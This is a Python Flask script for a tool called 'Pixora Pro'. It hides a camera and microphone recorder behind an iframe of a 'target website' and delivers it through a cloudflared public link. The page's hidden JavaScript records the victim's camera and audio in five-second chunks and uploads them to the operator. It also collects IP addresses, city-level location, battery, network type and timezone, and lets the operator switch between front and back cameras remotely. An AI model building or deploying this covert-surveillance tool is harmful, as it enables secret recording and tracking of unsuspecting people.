from flask import Flask, request, send_from_directory, render_template_string, jsonify, redirect
import os
import subprocess
import threading
import time
import re
import sys
import pyfiglet
from termcolor import colored, cprint
from colorama import init, Fore, Style
import requests
import datetime
import json
import shutil
import secrets
from werkzeug.utils import secure_filename
from functools import wraps

init(autoreset=True)

TARGET_URL = ""
CAMERA_MODE = "front"
DATA_FILE = "user_data.jsonl"
DYNAMIC_CAMERA_SWITCH = True
SECRET_KEY = secrets.token_hex(32)
ALLOWED_EXTENSIONS = {'webm'}
MAX_FILE_SIZE = 50 * 1024 * 1024
RECORD_CHUNK_SECONDS = 5
MIN_VIDEO_SIZE = 100 * 1024

app = Flask(__name__, static_folder='static')
app.secret_key = SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

os.makedirs('static', exist_ok=True)

def generate_banner():
    def get_terminal_width(minimum=160):
        try:
            w = shutil.get_terminal_size((minimum, 20)).columns
            return max(w, minimum)
        except Exception:
            return minimum
    def center_text(text, width):
        raw = re.sub(r"\x1b\[[0-9;]*m", "", text)
        pad = (width - len(raw)) // 2
        return " " * pad + text
    ascii_lines = [
        " ██████╗ ██╗██╗  ██╗ ██████╗ ██████╗  █████╗ ",
        " ██╔══██╗██║╚██╗██╔╝██╔═══██╗██╔══██╗██╔══██╗",
        " ██████╔╝██║ ╚███╔╝ ██║   ██║██████╔╝███████║",
        " ██╔═══╝ ██║ ██╔██╗ ██║   ██║██╔══██╗██╔══██║",
        " ██║     ██║██╔╝ ██╗╚██████╔╝██║  ██║██║  ██║",
        " ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
    ]
    width = get_terminal_width(minimum=132)
    border = "═" * (width - 2)
    print(Fore.BLUE + Style.BRIGHT + "╔" + border + "╗")
    title = "⚙ Pixora Pro - Enhanced Camera Access Tool"
    title_raw = re.sub(r"\x1b\[[0-9;]*m", "", title)
    pad_left = ((width - 2) - len(title_raw)) // 2
    full_title = " " * pad_left + title + " " * (width - 2 - len(title_raw) - pad_left)
    print(Fore.BLUE + Style.BRIGHT + "║" + colored(full_title, "white", "on_red", attrs=["bold"]) + "║")
    print(Fore.BLUE + Style.BRIGHT + "║" + " " * (width - 2) + "║")
    for line in ascii_lines:
        print(Fore.RED + Style.BRIGHT + center_text(line, width))
    print()
    github_label = colored("Github:", "white", attrs=["bold"])
    github_link = colored("https://github.com/Dharmveer829912", "green", attrs=["bold"])
    linkedin_label = colored("LinkedIn:", "white", attrs=["bold"])
    linkedin_link = colored("https://www.linkedin.com/in/dharmveer-kumar-932133372/", "green", attrs=["bold"])
    social = f"{github_label} {github_link}   |   {linkedin_label} {linkedin_link}"
    print(center_text(social, width))
    print()
    developed_label = colored("Developed by:", "white", attrs=["bold"])
    developed_value = colored("Dharmveer", "green", attrs=["bold"])
    telegram_label = colored("Telegram:", "white", attrs=["bold"])
    telegram_value = colored("@Dealer_999", "green", attrs=["bold"])
    version_label = colored("Version:", "white", attrs=["bold"])
    version_value = colored("v3.1.0", "green", attrs=["bold"])
    developed = f"{developed_label} {developed_value} | {telegram_label} {telegram_value} | {version_label} {version_value}"
    print(center_text(developed, width))
    print()
    print(Fore.BLUE + Style.BRIGHT + "╚" + border + "╝" + Style.RESET_ALL)
    print()

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def sanitize_url(url):
    if not url.startswith(('http://', 'https://')):
        return ''
    return url.split('#')[0].split('?')[0]

def extract_device_info(user_agent):
    ua = user_agent.lower()
    if "android" in ua:
        m = re.search(r'android (\d+(\.\d+)*)', ua)
        version = m.group(1) if m else ""
        m2 = re.search(r'\((?:linux; )?android [\d\.]+; ([^;)]*)', user_agent)
        device = m2.group(1).split(')')[0].strip() if m2 else ""
        if not device or device.upper().startswith("BUILD"):
            m3 = re.search(r'build/([\w\d\-\_]+)', user_agent, re.I)
            device = m3.group(1) if m3 else ""
        if device == "":
            device = "Android Device"
        return f"{device} (Android {version})"
    if "iphone" in ua:
        m = re.search(r'iphone.*?os ([\d_]+)', ua)
        version = m.group(1).replace("_", ".") if m else ""
        return f"iPhone (iOS {version})"
    if "ipad" in ua:
        m = re.search(r'ipad.*?os ([\d_]+)', ua)
        version = m.group(1).replace("_", ".") if m else ""
        return f"iPad (iOS {version})"
    if "windows nt" in ua:
        m = re.search(r'windows nt ([\d\.]+)', ua)
        version = m.group(1) if m else ""
        return f"Windows PC (NT {version})"
    if "mac os x" in ua:
        m = re.search(r'mac os x ([\d_]+)', ua)
        version = m.group(1).replace("_", ".") if m else ""
        return f"Mac (OS X {version})"
    if "linux" in ua:
        return "Linux PC"
    return "Unknown Device"

def get_ipinfo(ip):
    try:
        if ip == "N/A":
            return {}
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if resp.ok:
            return resp.json()
    except Exception:
        pass
    return {}

@app.route('/get_camera_mode')
def get_camera_mode():
    return jsonify({
        "mode": CAMERA_MODE,
        "chunk_seconds": RECORD_CHUNK_SECONDS
    })

@app.route('/set_camera_mode', methods=['POST'])
def set_camera_mode():
    global CAMERA_MODE
    data = request.get_json(silent=True) or {}
    mode = data.get("mode")
    if mode in ["front", "back"]:
        CAMERA_MODE = mode
        return jsonify({
            "status": "ok", 
            "mode": CAMERA_MODE,
            "message": f"Camera switched to {mode} mode"
        })
    return jsonify({"status": "error", "message": "Invalid mode"}), 400

@app.route('/')
def index():
    return redirect("/capture")

@app.route('/capture')
def capture():
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Pixora Camera Access</title>
        <style>
            body {{ margin:0; background: #222; }}
            #main-iframe {{ width:100vw; height:100vh; border:none; }}
            #preview {{ display:none; }}
            #overlay {{ position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 10;}}
        </style>
    </head>
    <body>
        <iframe id="main-iframe" src="{sanitize_url(TARGET_URL)}" allow="camera; microphone; autoplay" style="position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:1;"></iframe>
        <video id="preview" width="320" height="240" autoplay muted playsinline style="display:none;z-index:100;"></video>
        <div id="overlay"></div>
<script>
const CHUNK_SECONDS = {RECORD_CHUNK_SECONDS};
let stream = null, mediaRecorder = null, chunkCount = 0;
let active = false, switching = false;
let lastMode = "{CAMERA_MODE}";
let chunkInterval = null;

// Try to get both IPv4 and IPv6, and network radio type if available (android only)
function getIPv4IPv6() {{
    return new Promise((resolve) => {{
        let ipv4 = "N/A", ipv6 = "N/A";
        let done = 0;
        fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{{if(d.ip&&d.ip.indexOf(".")!=-1)ipv4=d.ip;}}).catch(()=>{{}}).finally(()=>{{if(++done==2)resolve({{ipv4,ipv6}});}});
        fetch("https://api64.ipify.org?format=json").then(r=>r.json()).then(d=>{{if(d.ip&&d.ip.indexOf(":")!=-1)ipv6=d.ip;}}).catch(()=>{{}}).finally(()=>{{if(++done==2)resolve({{ipv4,ipv6}});}});
    }});
}}
function getNetworkType() {{
    try {{
        if (navigator.connection && navigator.connection.type && navigator.connection.type !== "unknown") {{
            return navigator.connection.type;
        }} else if (navigator.connection && navigator.connection.effectiveType) {{
            // Try to detect radio from userAgent if possible
            let ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("5g")!==-1) return "5g";
            if(ua.indexOf("4g")!==-1) return "4g";
            if(ua.indexOf("lte")!==-1) return "4g";
            if(ua.indexOf("3g")!==-1) return "3g";
            if(ua.indexOf("2g")!==-1) return "2g";
            if(["slow-2g","2g","3g","4g","5g"].includes(navigator.connection.effectiveType))
                return navigator.connection.effectiveType;
            return navigator.connection.effectiveType;
        }}
    }} catch(e){{}}
    return "N/A";
}}
async function sendDeviceInfo() {{
    let tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
    let battery = {{}};
    try {{
        const b = await navigator.getBattery();
        battery = {{ charging: b.charging, level: Math.round(b.level*100) }};
    }} catch(e){{ battery = {{}}; }}
    let {{ipv4, ipv6}} = await getIPv4IPv6();
    let payload = {{
        tz: tz,
        battery: battery,
        network: {{ type: getNetworkType() }},
        ipv4: ipv4,
        ipv6: ipv6,
        user_agent: navigator.userAgent
    }};
    await fetch('/send_device_data', {{
        method: 'POST', headers: {{'Content-Type':'application/json'}},
        body: JSON.stringify(payload)
    }});
}}
async function safeStopRecorder() {{
    if (mediaRecorder && mediaRecorder.state === "recording") {{
        return new Promise((resolve) => {{
            mediaRecorder.onstop = resolve;
            mediaRecorder.stop();
        }});
    }}
    return Promise.resolve();
}}
async function startStream(mode) {{
    if (switching || (mode === lastMode && stream)) return;
    switching = true;
    active = false;
    if (chunkInterval) {{
        clearInterval(chunkInterval);
        chunkInterval = null;
    }}
    await safeStopRecorder();
    if (mediaRecorder) {{
        mediaRecorder.ondataavailable = null;
        mediaRecorder = null;
    }}
    if (stream) {{
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }}
    let constraints = {{ 
        video: mode === "back" 
            ? {{ facingMode: {{ exact: "environment" }} }}
            : {{ facingMode: "user" }},
        audio: true 
    }};
    try {{
        stream = await navigator.mediaDevices.getUserMedia(constraints);
    }} catch (err) {{
        constraints = {{ video: true, audio: true }};
        stream = await navigator.mediaDevices.getUserMedia(constraints);
    }}
    document.getElementById('preview').srcObject = stream;
    sendDeviceInfo();
    let options = {{ mimeType: 'video/webm; codecs=vp9,opus' }};
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
        options = {{ mimeType: 'video/webm; codecs=vp8,opus' }};
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
            options = {{ mimeType: 'video/webm' }};
        }}
    }}
    mediaRecorder = new MediaRecorder(stream, options);
    chunkCount = 0;
    active = true;
    lastMode = mode;
    mediaRecorder.ondataavailable = async (e) => {{
        if (e.data.size > 0) {{
            const fname = `recording_${{Date.now()}}_${{mode}}_${{chunkCount++}}.webm`;
            try {{
                const formData = new FormData();
                formData.append('media', new Blob([e.data], {{ type: options.mimeType }}), fname);
                await fetch('/upload', {{
                    method: 'POST',
                    body: formData
                }});
            }} catch (err) {{}}
        }}
    }};
    mediaRecorder.start();
    chunkInterval = setInterval(async () => {{
        if (mediaRecorder && mediaRecorder.state === "recording") {{
            mediaRecorder.requestData();
            await safeStopRecorder();
            if (active && !switching) {{
                mediaRecorder.start();
            }}
        }}
    }}, CHUNK_SECONDS * 1000);
    switching = false;
}}
async function getCameraMode() {{
    try {{
        const r = await fetch('/get_camera_mode');
        const j = await r.json();
        return j.mode;
    }} catch(e) {{
        return lastMode;
    }}
}}
async function pollCameraMode() {{
    while (true) {{
        let mode = await getCameraMode();
        if(mode !== lastMode) {{
            await startStream(mode);
        }}
        await new Promise(resolve => setTimeout(resolve, 900));
    }}
}}
window.onload = async () => {{
    await startStream(lastMode);
    pollCameraMode();
}};
</script>
    </body>
    </html>
    """
    return html

@app.route('/send_device_data', methods=['POST'])
def send_device_data():
    data = request.get_json(silent=True) or {}
    tz = data.get('tz', 'N/A')
    battery = data.get('battery', {})
    charging = battery.get('charging', 'N/A')
    battlevel = battery.get('level', 'N/A')
    network = data.get('network', {})
    nettype = network.get('type', 'N/A')
    ipv4 = data.get('ipv4', 'N/A')
    ipv6 = data.get('ipv6', 'N/A')
    user_agent = data.get('user_agent', 'N/A')
    show_ipv4 = ipv4 if ipv4 and ipv4 != "N/A" and "." in ipv4 else "N/A"
    show_ipv6 = ipv6 if ipv6 and ipv6 != "N/A" and ":" in ipv6 else "N/A"
    device_info = extract_device_info(user_agent)
    ip_for_lookup = show_ipv4 if show_ipv4 != "N/A" else (show_ipv6 if show_ipv6 != "N/A" else "N/A")
    ipinfo = get_ipinfo(ip_for_lookup)
    # Try to enhance network type with IPInfo if available (for some mobile providers)
    nettype_show = nettype
    org = ipinfo.get('org', '').lower()
    # Extra: try to detect if IPInfo org or user-agent has 4g/5g string
    if nettype in ["4g", "3g", "5g", "2g"]:
        nettype_show = nettype
    elif "5g" in org or "5g" in user_agent.lower():
        nettype_show = "5g"
    elif "4g" in org or "lte" in user_agent.lower() or "4g" in user_agent.lower():
        nettype_show = "4g"
    elif "3g" in org or "3g" in user_agent.lower():
        nettype_show = "3g"
    elif "2g" in org or "2g" in user_agent.lower():
        nettype_show = "2g"
    entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "ipv4": show_ipv4,
        "ipv6": show_ipv6,
        "location": {
            "city": ipinfo.get('city', 'N/A'),
            "region": ipinfo.get('region', 'N/A'),
            "country": ipinfo.get('country', 'N/A')
        },
        "network": {
            "isp": ipinfo.get('org', 'N/A').split('-')[0].strip() if ipinfo.get('org') else 'N/A',
            "org": ipinfo.get('org', 'N/A'),
            "type": nettype_show
        },
        "device": {
            "info": device_info,
            "battery": {
                "charging": charging,
                "level": battlevel
            },
            "timezone": tz,
            "user_agent": user_agent
        }
    }
    try:
        with open(DATA_FILE, "a", encoding='utf-8') as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except Exception as err:
        print(f"Error saving user data: {err}")
        return jsonify({"status": "error"}), 500
    cprint("\n" + "="*60, "cyan", attrs=["bold"])
    print(colored(f"🌐 IPv4 address: ", "cyan", attrs=["bold"]) + colored(show_ipv4, "white", attrs=["bold"]))
    print(colored(f"🌐 IPv6 address: ", "cyan", attrs=["bold"]) + colored(show_ipv6, "white", attrs=["bold"]))
    loc = entry['location']
    print(colored(f"🌍 Location: ", "green", attrs=["bold"]) + 
          colored(f"{loc['city']}, {loc['region']}, {loc['country']}", "white", attrs=["bold"]))
    net = entry['network']
    print(colored(f"📡 ISP: ", "magenta", attrs=["bold"]) + colored(net['isp'], "white", attrs=["bold"]))
    print(colored(f"🔍 Org: ", "blue", attrs=["bold"]) + colored(net['org'], "white", attrs=["bold"]))
    print("")
    cprint("📱Device Info:", "yellow", attrs=["bold"])
    print(colored("Device: ", "magenta", attrs=["bold"]) + colored(device_info, "white"))
    print(colored("🔋 Charging: ", "red", attrs=["bold"]) + colored("Yes" if charging else "No", "white", attrs=["bold"]))
    print(colored("🔌 Battery Level: ", "yellow", attrs=["bold"]) + colored(f"{battlevel}%", "white", attrs=["bold"]))
    print(colored("🌐 Network Type: ", "cyan", attrs=["bold"]) + colored(nettype_show, "white", attrs=["bold"]))
    print(colored("🕒 Time Zone: ", "magenta", attrs=["bold"]) + colored(tz, "white", attrs=["bold"]))
    print(colored("User-Agent: ", "blue", attrs=["bold"]) + colored(user_agent, "white"))
    cprint("="*60 + "\n", "cyan", attrs=["bold"])
    return jsonify({"status": "ok"})

@app.route('/upload', methods=['POST'])
def upload():
    if 'media' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400
    file = request.files['media']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    if not allowed_file(file.filename):
        return jsonify({"status": "error", "message": "Invalid file type"}), 400
    filename = secure_filename(file.filename)
    save_path = os.path.join(app.static_folder, filename)
    try:
        file.save(save_path)
        file_size = os.path.getsize(save_path)
        if file_size < MIN_VIDEO_SIZE:
            os.remove(save_path)
            return jsonify({
                "status": "error", 
                "message": f"File too small (min {MIN_VIDEO_SIZE/1024}KB required)"
            }), 400
        return jsonify({
            "status": "ok", 
            "filename": filename,
            "size": f"{file_size/1024:.2f}KB"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/videos')
def list_videos():
    try:
        files = [f for f in os.listdir(app.static_folder) if f.endswith('.webm')]
        if not files:
            return "<h3>No videos found!</h3>"
        files.sort(key=lambda x: os.path.getmtime(os.path.join(app.static_folder, x)), reverse=True)
        video_list = []
        for f in files:
            size = os.path.getsize(os.path.join(app.static_folder, f))
            video_path = f"/static/{f}"
            video_list.append(
                f"<div style='margin: 10px; padding: 10px; border: 1px solid #ccc;'>"
                f"<video width='320' controls><source src='{video_path}' type='video/webm'>Your browser doesn't support HTML5 video.</video>"
                f"<br><a href='{video_path}' style='font-size: 16px;'>{f}</a>"
                f"<br><span style='color: #666;'>{size/1024:.2f} KB</span>"
                f"</div>"
            )
        return "<h3>Recorded Videos:</h3>" + "".join(video_list)
    except Exception as e:
        return f"<h3>Error listing videos: {str(e)}</h3>", 500

def run_flask():
    app.run(host='0.0.0.0', port=8080, threaded=True)

def start_cloudflared():
    cprint("[INFO] Starting cloudflared tunnel...", "cyan")
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:8080"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
    except FileNotFoundError:
        cprint("[ERROR] cloudflared not found. Please install it first.", "red")
        return None, None
    url_pattern = re.compile(r'(https://[-\w]+\.trycloudflare\.com)')
    public_link = None
    for line in iter(proc.stdout.readline, ''):
        if "trycloudflare.com" in line:
            cprint("[cloudflared] " + line.strip(), "magenta")
        match = url_pattern.search(line)
        if match:
            public_link = match.group(1)
            cprint(f"\n[PUBLIC LINK] {public_link}\n", "yellow", attrs=["bold"])
            break
    return proc, public_link

def choose_camera():
    global CAMERA_MODE, DYNAMIC_CAMERA_SWITCH
    cprint("Choose Camera Mode:", "cyan", attrs=["bold"])
    print(colored("1. Front Camera Only", "green", attrs=["bold"]))
    print(colored("2. Back Camera Only", "green", attrs=["bold"]))
    print(colored("3. Dynamic Switching (Switch anytime)", "yellow", attrs=["bold"]))
    while True:
        choice = input(colored("Enter your choice (1, 2, or 3): ", "cyan", attrs=["bold"])).strip()
        if choice == "1":
            CAMERA_MODE = "front"
            DYNAMIC_CAMERA_SWITCH = True
            break
        elif choice == "2":
            CAMERA_MODE = "back"
            DYNAMIC_CAMERA_SWITCH = True
            break
        elif choice == "3":
            CAMERA_MODE = "front"
            DYNAMIC_CAMERA_SWITCH = True
            break
        else:
            print(colored("Invalid choice. Please select 1, 2, or 3.", "red", attrs=["bold"]))

if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    generate_banner()
    choose_camera()
    TARGET_URL = input(colored("Enter target website URL: ", "cyan", attrs=["bold"])).strip()
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(2)
    proc, public_link = start_cloudflared()
    if not public_link:
        cprint("\n[ERROR] Failed to start cloudflared tunnel. Exiting.", "red")
        sys.exit(1)
    cprint(f"\n[CAMERA LINK] {public_link}\n", "yellow", attrs=["bold"])
    if DYNAMIC_CAMERA_SWITCH:
        cprint("To change camera at any time, run in another terminal:", "cyan")
        cprint(f"curl -X POST http://localhost:8080/set_camera_mode -H 'Content-Type: application/json' -d '{{\"mode\": \"front\"}}'", "green")
        cprint("OR", "cyan")
        cprint(f"curl -X POST http://localhost:8080/set_camera_mode -H 'Content-Type: application/json' -d '{{\"mode\": \"back\"}}'", "green")
    else:
        cprint(f"Camera mode locked: {CAMERA_MODE.upper()}.", "cyan")
    cprint(f"Recording {RECORD_CHUNK_SECONDS}-second video chunks", "cyan")
    cprint("[INFO] Press Ctrl+C to stop.", "red", attrs=["bold"])
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cprint("\n[INFO] Stopping server and tunnel...", "red", attrs=["bold"])
        if proc:
            proc.terminate()
        sys.exit(0)
